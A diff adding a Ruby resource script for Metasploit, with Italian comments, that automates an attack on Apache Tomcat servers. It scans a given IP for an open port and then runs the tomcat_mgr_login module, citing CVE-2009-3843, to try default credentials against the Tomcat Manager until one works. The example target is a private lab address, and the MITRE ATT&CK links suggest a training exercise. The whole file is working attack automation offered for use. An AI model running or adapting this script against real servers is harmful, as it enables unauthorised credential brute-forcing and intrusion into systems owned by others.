@@ -1,0 +1,127 @@
+<ruby>                                                                                                                                                                                        
+#                                                                                                                                                                                             
+# Stampa guida                                                                                                                                                                    
+#                                                                                                                                                                                             
+def help_me                                                                                                                                                                                   
+    help = %Q|
+    Descrizione:
+            Questo resource script Metasploit rileva nella macchina in targetIP quali sono server tomcat che girano sulla porta 8080 e lo attacca sfruttando la vulnerabilità CVE-2009-3843 per fare dei tentativi di accesso al Tomcat Application Manager usando delle credenziali specifiche predefinite. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3843
+            In particolare, questa vulnerabilità è classificata come CWE-287: Improper Authentication. Questo exploit è utilizzato per la ricerca di credenziali di accesso deboli o predefinite per un'applicazione Tomcat. 
+            https://cwe.mitre.org/data/definitions/287.html
+
+            Una volta eseguito lo script è possibile visualizzare i tentativi di accesso eseguiti e se lo script ha successo si possono conoscere le credenziali corrette.
+
+            Moduli utilizzati durante il processo di attacco: 
+
+                pre exploit:
+                    https://attack.mitre.org/techniques/T1595/001/
+                    ricerca degli host con porta 8080 aperta:
+                    auxiliary/scanner/portscan/tcp
+                    https://www.rapid7.com/db/modules/auxiliary/scanner/portscan/tcp/
+
+
+                exploit:
+                    https://attack.mitre.org/techniques/T1110/004/
+                    https://attack.mitre.org/techniques/T0812/
+                    auxiliary/scanner/http/tomcat_mgr_login
+                    https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/
+
+
+    Uso:
+            msfconsole -r tomcat_mgr_login.rc [targetPORT] [targetIP]
+
+    Parametri:
+            targetPORT      -  PORTA da analizzare e attaccare
+            targetIP      -  indirizzo IP da analizzare e attaccare
+
+    Esempio:
+            msfconsole -r tomcat_mgr_login.rc 8080 172.20.0.6
+
+    |
+
+    help = help.gsub(/^\t/, '')
+    print_line(help)
+end
+
+
+#
+# Esegue processo di attacco
+#
+def execute_attack(targetPORT, targetIP)
+    
+    # PRE-EXPLOIT
+    # seleziona come modulo attivo lo scanner di porte tcp
+    run_single("use auxiliary/scanner/portscan/tcp")
+    # configura lo scanner di modo che controlli se l'indirizzo ip targetIP ha la porta aperta
+    run_single("set PORTS #{targetPORT}")
+    run_single("set RHOSTS #{targetIP}")
+    # esegue scanner porta http 8080
+    run_single("run")
+    
+    # EXPLOIT
+    # seleziona come modulo attivo lo scanner che sfrutta la vulnerabilità CVE-2009-3843
+    run_single("use auxiliary/scanner/http/tomcat_mgr_login")
+    # configura lo scanner di modo che attacchi l'indirizzo ip e porta definite
+    run_single("set RHOST #{targetIP}")
+    run_single("set RPORT #{targetPORT}")
+    # configura lo scanner di modo che fermi l'esecuzione quando trova delle credenziali corrette
+    run_single("set STOP_ON_SUCCESS true")
+    # esecuzione
+    run_single("exploit")
+    run_single("exit")
+
+end
+
+
+#
+# Inizializzazione parametri
+#
+def init_args
+    args = {}
+
+    # se tra gli argomenti passati è presente la parola help ritorno come args help settato a true
+    if ARGV.join('') =~ /^help$/i
+        args[:help] = true
+        return args
+    end
+
+    # costruisco la struttura dati contenente gli argomenti passati
+    args[:targetPORT]      = ARGV.shift || ''
+    args[:targetIP]      = ARGV.shift || ''
+    # verifico che tutti i parametri siano stati corretamente inizializzati
+    raise ArgumentError, "Specificare PORTA del sistema da attaccare" if args[:targetPORT].empty?
+    raise ArgumentError, "Specificare IP del sistema da attaccare" if args[:targetIP].empty?
+
+    return args
+end
+
+
+#
+# Codice main
+#
+begin
+    # inizializzo parametri
+    args = init_args
+
+    # se tra gli argomenti è presente la parola help,
+    # visualizzo la guida e termino
+    if args[:help]
+        help_me
+        return
+    end
+
+    # eseguo il processo di attacco
+    execute_attack(args[:targetPORT], args[:targetIP])
+
+rescue ArgumentError => e
+    print_error("Invalid argument: #{e.message}")
+    return
+
+rescue RuntimeError => e
+    print_error(e.message)
+    return
+
+rescue ::Exception => e
+    raise e
+end
+</ruby>
